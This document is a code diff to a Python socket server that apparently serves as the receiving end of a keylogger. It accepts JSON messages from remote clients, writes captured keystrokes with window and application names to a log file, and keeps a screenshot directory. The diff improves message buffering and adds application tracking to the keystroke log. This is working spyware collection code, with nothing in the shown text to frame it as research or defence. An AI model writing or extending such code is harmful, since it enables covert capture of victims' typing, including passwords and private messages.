@@ -15,18 +15,21 @@ os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 def handle_client(conn, addr):
     print(f"[+] New connection from {addr[0]}:{addr[1]}")
     try:
+        buffer = ""
         while True:
-            data = conn.recv(1024)
+            data = conn.recv(1024).decode('utf-8')
             if not data:
                 break
-
-            try:
-                message = json.loads(data.decode('utf-8'))
-                log_data(message)
-            except (json.JSONDecodeError, UnicodeDecodeError) as e:
-                print(f"[!] Error decoding JSON: {e}")
-            except Exception as e:
-                print(f"[!] Error processing message: {e}")
+            buffer += data
+            while '\n' in buffer:
+                message, buffer = buffer.split('\n', 1)
+                try:
+                    message_json = json.loads(message)
+                    log_data(message_json)
+                except json.JSONDecodeError as e:
+                    print(f"[!] Error decoding JSON: {e}")
+                except Exception as e:
+                    print(f"[!] Error processing message: {e}")
 
     except ConnectionResetError:
         print(f"[-] Connection from {addr[0]}:{addr[1]} lost.")
@@ -41,7 +44,8 @@ def log_data(data):
     timestamp = data.get('timestamp', 'No Timestamp')
     
     if log_type == 'keystroke':
-        log_entry = f"[{timestamp}] Keystroke: {data.get('key')} (Window: {data.get('window_title')})"
+        application = data.get('application', 'UNKNOWN')
+        log_entry = f"[{timestamp}] Keystroke: {data.get('key')} (Application: {application}, Window: {data.get('window_title')})"
         print(log_entry)
         with open(os.path.join(LOG_DIR, 'keystrokes.log'), 'a') as f:
             f.write(log_entry + '\n')
@@ -69,6 +73,8 @@ def start_server():
         print(f"[*] Listening on {HOST}:{PORT}")
         while True:
             conn, addr = s.accept()
+            # In a real application, you'd likely want to handle each client
+            # in a separate thread to manage multiple connections.
             handle_client(conn, addr)
 
 if __name__ == "__main__":
